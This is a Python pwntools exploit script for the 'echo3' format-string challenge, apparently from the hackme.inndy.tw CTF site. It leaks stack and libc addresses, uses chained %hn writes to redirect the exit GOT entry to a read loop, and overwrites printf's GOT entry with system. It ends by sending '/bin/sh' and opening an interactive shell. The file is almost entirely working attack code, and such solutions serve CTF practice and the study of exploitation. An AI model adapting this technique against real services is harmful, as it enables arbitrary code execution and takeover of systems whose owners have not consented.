#!/usr/bin/env python
# -*- coding: utf-8 -*-
# 
from pwn import *
context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh', '-c']
io = process('./echo3', env = {'LD_PRELOAD': '../libc-2.23.so.i386'})
# io = remote('hackme.inndy.tw', 7720)
# raw_input('debug>')
# gdb.attach(io,'b * 0x8048646')
elf = ELF('echo3')
libc = ELF('../libc-2.23.so.i386')

exit_got = elf.got['exit']
readloop = 0x804861a

# leak the addr of stack
# rewrite the exit got to readloop to make the read unstop
# write the printf got to stack
# calculate the system addr 
# rewrite the addr of system to printf got


# leak the addr of stack
io.send('%10$p->%14$p<-leaktheaddr!!'  + '\x00')
reply = io.recvuntil('->',drop = True)
if '0x' not in reply:
    exit()
libc_base = int(reply, 16)- 11 - libc.sym['setbuffer']
reply = io.recvuntil('<-', drop = True)
if '0x' not in reply:
    exit()
esp = int(reply, 16)-0x10
print 'esp       -> ' + hex(esp)
print 'libc base -> ' + hex(libc_base)
if libc_base % 4096 != 0:   # 随机情况不正确，重新执行
    print 'case error!'
#     raw_input()
    io.close()
    exit()
io.recvuntil('!!')
raw_input('go on ->')
gdb.attach(io, 'b * 0x8048646')

# write a location on stack whitch contain an addr pointing to code(0x804****)
# 13:004c│  0xffb3042c —▸ 0x804877b (main+236)   -> 1e:0078
# 15:0054│  0xffb30434 —▸ 0x804a060 (magic)      -> 1f:007c
payload = '%{}c%{}$hn'.format((esp+0x4c)& 0xffff, 0x1e)
payload += '%8c%31$hnwrite_a_location_to_stack>>'  + '\x00' 
io.send(payload)
io.recvuntil('>>')

# write the exit got to what we make just now
# 1e:78│ 0x0458 —▸ 053c —▸ 0x042c(0x13) -> 0x804a020
# 1f:7c│ 0x045c —▸ 0534 —▸ 0x0434(0x15) -> 0x804a022
payload = '%{}c%{}$hn'.format((exit_got & 0xffff),87)
payload += '%2c%85$hnwrite_exitgot_to_it+-' + '\x00'
io.send(payload)
io.recvuntil('+-')

# rewrite the edit got to readloop to make read unstop
payload = '%{}c%{}$hn'.format((readloop >> 16) & 0xffff, 0x15)
payload += '%{}c%{}$hn'.format(((readloop & 0xffff) - (readloop >> 16)& 0xffff), 0x13) + 'rewrite_the_exitgot_to_readloop**\x00'
# 13:004c| 0xffb3042c —▸ 0x804a020 ->1a 86 (0x804861a
# 15:0054│ 0xffb30434 —▸ 0x8048022 ->04 08
io.send(payload)
io.recvuntil('**')
# -***********************-

# calculate the addr of system
sys_addr = libc_base + libc.sym['system']

# write printf_got to 042c -> exitgot 
io.send('%20c%87$hhn%2c%85$hhnchange_exitgot_to_printfgot::' + '\x00')
io.recvuntil('::')

# write sys_addr to printf got
print 'sys_addr -> ' + hex(sys_addr)
payload = '%{}c%{}$hn'.format((sys_addr >> 16)& 0xffff, 0x1a)
payload += '%{}c%{}$hn'.format(((sys_addr & 0xffff) - (sys_addr >> 16)&0xffff), 0x18)
payload += 'write_the_sysaddr_to_printf-got##\x00'
io.send(payload)
io.recvuntil('##')


io.send('/bin/sh\x00')
io.interactive()
io.close()


